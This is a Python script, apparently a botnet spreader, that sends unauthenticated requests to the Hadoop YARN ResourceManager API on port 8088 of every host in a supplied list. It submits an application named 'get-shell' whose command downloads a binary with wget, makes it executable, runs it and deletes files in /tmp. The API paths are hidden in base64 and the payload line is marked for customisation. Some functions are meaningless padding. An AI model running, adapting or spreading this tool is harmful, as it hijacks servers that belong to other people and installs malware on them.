import sys
import threading
import requests
import os, base64
import pyfiglet
from time import sleep
from multiprocessing import Queue
from threading import Thread

try:
    proxy_list = open(sys.argv[1], "r").readlines()
except:
    print("Usage is exploit.py <proxylist.txt>")
    sys.exit()

# CHANGE PAYLOAD HERE
cmd = "cd /tmp; wget http://ip/bin.x86; chmod 777 *; ./bin.x86 x86.exploit; rm -rf *"
# CHANGE PAYLOAD HERE

def exploit_lor():
    bypass = "01111000 00110000 00110001 01000001 00110100 00110001 00111000 01000001"
    m2a = "31,32,33,34,35,36,37,38,39"
    ua = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    m4a = "Accept-Language: en-US,en;q=0.8"
    bypasscaptcha = "b3091224eb27a51f413505d96b74c203fcffc17bb3091224eb27a51f413505d96b74c203fcffc17b"

    combined = ""
    for i in bypass:
        combined += i
    for j in bypasscaptcha:
        combined += j

    trybreak = True
    while (len(combined) > 0):
        combined = combined[:-1]

    return [m2a, 'EXPLOIT', "EXPLOITEDD!!!", ua, {}]

def main_exploit(proxies):
    exploit_lor()
    threads = []
    for proxy in proxies:
        retry_count = 0
        max_retries = 3
        while retry_count < max_retries:
            try:
                exr = base64.b64decode('WUFSTg==').decode('utf-8')
                pat1 = base64.b64decode('OjgwODgvd3MvdjEvY2x1c3Rlci9hcHBz').decode('utf-8')
                pat2 = base64.b64decode('OjgwODgvd3MvdjEvY2x1c3Rlci9hcHBzL25ldy1hcHBsaWNhdGlvbg==').decode('utf-8')
                url = 'http://' + proxy + pat2
                resp = requests.post(url, timeout=3)
                ot_ID = resp.json()['application-id']
                url = 'http://' + proxy + pat1
                data = {
                    'application-id': ot_ID,
                    'application-name': 'get-shell',
                    'am-container-spec': {
                        'commands': {
                            'command': '%s' % cmd,
                        },
                    },
                }
                res = requests.post(url, json=data, timeout=3)
                print(f"Exploited: {proxy}")
                break
            except Exception as e:
                if ("Connection aborted." in str(e)):
                    print(f"HOST DIED: {proxy}")
                    break
                else:
                    retry_count += 1
                    print(f"Retrying connection to {proxy} ({retry_count}/{max_retries})")

        thread = Thread(target=main_exploit, args=(proxy,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

queue = Queue()
queue_count = 0
def main():
    print(pyfiglet.figlet_format("STARTING..."))
    print("Made by @4N0S")
    print()
    print()
    sleep(3)
    global queue_count
    for line in proxy_list:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] PROXIES ADDED TO QUEUE!!!" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=main_exploit, args=(input,))
            thread.start()
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return

if __name__ == "__main__":
    main()